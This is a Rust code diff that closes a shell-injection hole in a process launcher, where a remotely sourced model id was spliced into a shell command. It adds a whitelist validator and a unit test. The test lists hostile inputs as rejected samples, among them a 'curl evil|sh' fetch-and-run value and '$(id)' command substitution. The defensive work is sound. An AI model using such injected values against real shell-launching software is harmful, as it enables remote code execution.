@@ -616,7 +616,23 @@ impl ProcessManager {
 
         if tool_id == "mimocode" {
             if let Some(ref mid) = model_id {
-                full_command = format!("{} --model echobird/{}", command, mid);
+                // The model id arrives from a remote `/v1/models` catalog
+                // (upstream_model_catalog only checks "non-empty, ≤512 bytes"),
+                // gets persisted into mimocode.json(c), and is read back here —
+                // i.e. it is attacker-controlled. It is spliced into a shell
+                // command line (`exec /bin/sh -c` on Unix, `cmd /C` on Windows),
+                // so drop it unless every byte is literal in both shells.
+                let argument = format!("echobird/{mid}");
+                match literal_shell_argument(&argument) {
+                    Some(argument) => {
+                        full_command = format!("{} --model {}", full_command, argument)
+                    }
+                    None => log::warn!(
+                        "[ProcessManager] MiMo model id is not shell-safe, launching without \
+                         --model: {:?}",
+                        mid
+                    ),
+                }
             }
         }
 
@@ -1593,6 +1609,24 @@ fn windows_shell_terminal(
         .env("ECHOBIRD_CLI_COMMAND", command)
         .env("ECHOBIRD_CLI_CWD", cwd);
     launcher
+}
+
+/// Accept `value` only if it can be spliced into a shell command line as one
+/// literal argument on *both* POSIX shells and `cmd.exe`.
+///
+/// A whitelist beats escaping here: `cmd.exe` expands `%VAR%` / `!VAR!` even
+/// inside double quotes, and `\"` escaping differs between cmd and PowerShell,
+/// so no single escape is correct on every host we launch under. Values that
+/// reach this (model ids) only ever need this alphabet.
+fn literal_shell_argument(value: &str) -> Option<&str> {
+    let safe = !value.is_empty()
+        && value.len() <= 256
+        && !value.starts_with('-')
+        && value.bytes().all(|byte| {
+            byte.is_ascii_alphanumeric()
+                || matches!(byte, b'-' | b'_' | b'.' | b'/' | b':' | b'@' | b'+')
+        });
+    safe.then_some(value)
 }
 
 // Single-quote-wrap a string for safe inclusion in a POSIX shell command
@@ -3167,6 +3201,27 @@ try {
                 .unwrap();
             assert!(output.status.success());
             assert_eq!(String::from_utf8(output.stdout).unwrap(), argument);
+        }
+    }
+
+    #[test]
+    fn mimocode_model_flag_rejects_shell_metacharacters() {
+        for accepted in ["echobird/vendor/model-1.5", "echobird/x_y@z+1"] {
+            assert_eq!(super::literal_shell_argument(accepted), Some(accepted));
+        }
+        for rejected in [
+            "echobird/x;curl evil|sh",
+            "echobird/$(id)",
+            "echobird/a b",
+            "echobird/a\"b",
+            "echobird/a'b",
+            "echobird/%PATH%",
+            "echobird/`id`",
+            "echobird/a\nb",
+            "",
+            "--help",
+        ] {
+            assert_eq!(super::literal_shell_argument(rejected), None, "{rejected:?}");
         }
     }
 
